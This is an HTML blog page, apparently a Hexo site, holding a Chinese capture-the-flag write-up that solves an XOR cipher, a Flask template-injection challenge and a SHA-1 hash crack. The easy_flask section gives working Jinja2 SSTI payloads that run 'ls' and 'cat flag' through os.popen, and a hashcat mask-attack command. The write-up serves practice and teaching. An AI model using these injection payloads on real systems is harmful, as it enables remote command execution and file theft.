@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>C++ note blog | C++ note blog</title><meta name="author" content="Linear"><meta name="copyright" content="Linear"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="春秋GAME          WRITEUP一、个人信息个人名称：infinite 个人排名:647 二、解题情况  三、解题过程一、简单算术操作内容：拿到文件， 1ys~xdg&#x2F;m@]mjkz@vl@z~lf&gt;b  给了这一串东西，显然经过加密了，题目提示异或，考虑先转化为二进制 使用文本转二进制工具[(https:&#x2F;&#x2F;uutool.cn&#x2F;txt2bin&#x2F;)，转换得到， 11111001">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C++ note blog">
+<meta property="og:url" content="http://example.com/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/index.html">
+<meta property="og:site_name" content="C++ note blog">
+<meta property="og:description" content="春秋GAME          WRITEUP一、个人信息个人名称：infinite 个人排名:647 二、解题情况  三、解题过程一、简单算术操作内容：拿到文件， 1ys~xdg&#x2F;m@]mjkz@vl@z~lf&gt;b  给了这一串东西，显然经过加密了，题目提示异或，考虑先转化为二进制 使用文本转二进制工具[(https:&#x2F;&#x2F;uutool.cn&#x2F;txt2bin&#x2F;)，转换得到， 11111001">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/head.png">
+<meta property="article:published_time" content="2025-01-17T05:58:56.768Z">
+<meta property="article:modified_time" content="2025-01-17T08:53:11.295Z">
+<meta property="article:author" content="Linear">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/head.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "http://example.com/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/",
+  "image": "http://example.com/img/head.png",
+  "datePublished": "2025-01-17T05:58:56.768Z",
+  "dateModified": "2025-01-17T08:53:11.295Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Linear",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'C++ note blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(url(/img/preview.jpg));"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">C++ note blog</span></a><a class="nav-page-title" href="/"><span class="site-name">C++ note blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-17T05:58:56.768Z" title="发表于 2025-01-17 13:58:56">2025-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-17T08:53:11.295Z" title="更新于 2025-01-17 16:53:11">2025-01-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="春秋GAME-WRITEUP"><a href="#春秋GAME-WRITEUP" class="headerlink" title="春秋GAME          WRITEUP"></a>春秋GAME          WRITEUP</h2><h3 id="一、个人信息"><a href="#一、个人信息" class="headerlink" title="一、个人信息"></a>一、个人信息</h3><p>个人名称：infinite</p>
+<p>个人排名:647</p>
+<h3 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h3><p><img src="C:/Users/infinite/AppData/Roaming/Typora/typora-user-images/image-20250117164002385.png" alt="image-20250117164002385"></p>
+<p><img src="C:/Users/infinite/AppData/Roaming/Typora/typora-user-images/image-20250117164044162.png" alt="image-20250117164044162"></p>
+<h3 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h3><h4 id="一、简单算术"><a href="#一、简单算术" class="headerlink" title="一、简单算术"></a>一、简单算术</h4><h5 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h5><p>拿到文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ys~xdg/m@]mjkz@vl@z~lf&gt;b</span><br></pre></td></tr></table></figure>
+
+<p>给了这一串东西，显然经过加密了，题目提示异或，考虑先转化为二进制</p>
+<p>使用文本转二进制工具[(<a target="_blank" rel="noopener" href="https://uutool.cn/txt2bin/)%EF%BC%8C%E8%BD%AC%E6%8D%A2%E5%BE%97%E5%88%B0%EF%BC%8C">https://uutool.cn/txt2bin/)，转换得到，</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111001 1110011 1111110 1111000 1100100 1100111 101111 1101101 1000000 1011101 1101101 1101010 1101011 1111010 1000000 1110110 1101100 1000000 1111010 1111110 1101100 1100110 111110 1100010</span><br></pre></td></tr></table></figure>
+
+<p>明文应该含有flag，将这flag四个字符转为二进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1100110 1101100 1100001 1100111</span><br></pre></td></tr></table></figure>
+
+<p>根据异或的提示，反推密钥<br>$$<br>1100110\oplus key &#x3D; 1111001<br>$$<br>以此类推</p>
+<p>对比发现，密钥应该是0011111一直重复</p>
+<p>于是编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;1111001 1110011 1111110 1111000 1100100 1100111 0101111 1101101 1000000 1011101 1101101 1101010 1101011 1111010 1000000 1110110 1101100 1000000 1111010 1111110 1101100 1100110 0111110 1100010&quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">int</span>(i,<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span> ]</span><br><span class="line">m = <span class="built_in">int</span>(<span class="string">&#x27;0011111&#x27;</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">list</span> = [i^m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>]</span><br><span class="line">char = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(char))</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h5 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h5><p>flag{x0r_Brute_is_easy!}</p>
+<h4 id="二、easy-flask"><a href="#二、easy-flask" class="headerlink" title="二、easy_flask"></a>二、easy_flask</h4><h5 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h5><p>题目提示了是Flask框架，常见的是SSTI注入</p>
+<p><img src="C:\Users\infinite\AppData\Roaming\Typora\typora-user-images\image-20250117121105174.png" alt="image-20250117121105174"></p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行测试，发现存在SSTI漏洞</p>
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__</span><br></pre></td></tr></table></figure>
+
+<p>自带os模块进行注入</p>
+<p>先看看flag在哪</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?user=&#123;&#123;lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\infinite\AppData\Roaming\Typora\typora-user-images\image-20250117121221413.png" alt="image-20250117121221413"></p>
+<p>发现就是flag文件，使用cat打开即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?user=&#123;&#123;lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\infinite\AppData\Roaming\Typora\typora-user-images\image-20250117121316248.png" alt="image-20250117121316248"></p>
+<h5 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h5><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p>
+<h4 id="三、通往哈希的旅程"><a href="#三、通往哈希的旅程" class="headerlink" title="三、通往哈希的旅程"></a>三、通往哈希的旅程</h4><h5 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h5><p>根据题目意思，得知是纯数字的HASH值，直接使用hashcat爆破即可</p>
+<p>首先用HashIdentifier识别HASH加密方式</p>
+<p><img src="C:\Users\infinite\AppData\Roaming\Typora\typora-user-images\image-20250117134222796.png" alt="image-20250117134222796"></p>
+<p>最有可能的是SHA-1</p>
+<p>于是用Hashcat破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 100 -a 3 ca12fd8250972ec363a16593356abb1f3cf3a16d ?d?d?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="C:\Users\infinite\AppData\Roaming\Typora\typora-user-images\image-20250117134305269.png" alt="image-20250117134305269"></p>
+<h5 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h5><p>flag{18876011645}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Linear</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/">http://example.com/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">C++ note blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/head.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/01/re/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">b@se64 wp打开压缩包，获得一个可执行文件，用IDA pro打开  shift+F12打开函数列表，发现start函数  发现调用了140001154()函数  进而找到14000184E函数  是一个比较简单的字符串比较函数，下面那个疑似base64编码 但是解码之后好像没什么含义  发现还有一个1400016D0函数  让GPT审阅一下，其实就是base64进行了偏移的变体 他顺便把解密代码也写了…，于是拿到flag 12345678910111213141516171819202122232425262728293031def custom_base64_decode(encoded_str):    decoded_bytes = []        for i in range(0, len(encoded_str), 4):        if i + 4 &gt; len(encoded_str):            break  # 防止越界        c1 = ord(encoded_str[i]) - 61        c2 =...</div></div></div></a><a class="pagination-related" href="/2024/12/29/%E6%95%B0%E7%94%B5%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">数电第四次实验报告第十一周实验： 集成计数器的功能测试及应用（上次实验报告不小心一起交了第十一周的）实验时间：12月8日实验一：测试74ls160功能上周已做过 实验二：基于74LS160和74LS138，设计跑马灯电路      实验三：1． 利用74LS160设计模为N的计数器，计数器的状态的个位数值用74LS48译码后在7 段数码管上显示出来，十位数值用BCD码七段数码管显示。其中,M&#x3D;学号后三位的加和，如果 M&lt;&#x3D;10,则N&#x3D;M+16,否则 N&#x3D;M。画出基于74LS160的逻辑电路图，然后测试。M&#x3D;0+4+6&#x3D;10，N&#x3D;26 也就是取0-25     实验感想：用计数器实现了类似电子钟一样的功能，十分神奇，数字不断变化，是从来没有过的体验第十二周实验：计数器及移位寄存器的应用实验时间：12月15日1．   测试74LS161的逻辑功能：实验图14-1为CT54&#x2F;74161的逻辑符号，按实验表14-1逐项测试其逻辑功能。 ​                               ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Linear</div><div class="author-info-description">人生若只若初见，何事秋风悲画扇</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Linear Algebra & C++</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8BGAME-WRITEUP"><span class="toc-number">1.</span> <span class="toc-text">春秋GAME          WRITEUP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、个人信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.2.</span> <span class="toc-text">二、解题情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">三、解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E5%8D%95%E7%AE%97%E6%9C%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">一、简单算术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9A"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">flag值：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81easy-flask"><span class="toc-number">1.3.2.</span> <span class="toc-text">二、easy_flask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9A-1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">flag值：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%80%9A%E5%BE%80%E5%93%88%E5%B8%8C%E7%9A%84%E6%97%85%E7%A8%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">三、通往哈希的旅程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-2"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9A-2"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">flag值：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/01/re/" title="无标题">无标题</a><time datetime="2025-02-01T08:36:24.602Z" title="发表于 2025-02-01 16:36:24">2025-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/17/%E6%98%A5%E7%A7%8B%E8%B5%9BWP/" title="无标题">无标题</a><time datetime="2025-01-17T05:58:56.768Z" title="发表于 2025-01-17 13:58:56">2025-01-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/29/%E6%95%B0%E7%94%B5%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" title="无标题">无标题</a><time datetime="2024-12-29T12:29:06.409Z" title="发表于 2024-12-29 20:29:06">2024-12-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/28/%E6%95%B0%E7%94%B5%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A/" title="无标题">无标题</a><time datetime="2024-12-28T05:48:38.907Z" title="发表于 2024-12-28 13:48:38">2024-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%95%B0%E7%94%B5%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" title="无标题">无标题</a><time datetime="2024-12-14T06:35:06.515Z" title="发表于 2024-12-14 14:35:06">2024-12-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Linear</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
